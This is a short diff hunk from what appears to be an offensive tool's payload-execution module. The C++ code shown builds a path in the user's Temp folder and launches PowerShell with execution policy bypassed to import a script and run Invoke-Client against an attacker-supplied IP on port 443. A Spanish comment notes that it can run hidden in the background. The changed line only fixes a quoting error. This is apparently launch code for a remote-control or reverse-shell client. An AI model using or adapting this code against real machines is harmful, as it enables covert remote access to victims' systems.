@@ -70,7 +70,7 @@ class executing_payload(Module):
 		       GetUserName(username, &username_len);
 		       string user(username);      
 		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
-		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\";
+		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\"";
 		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
 
 		}
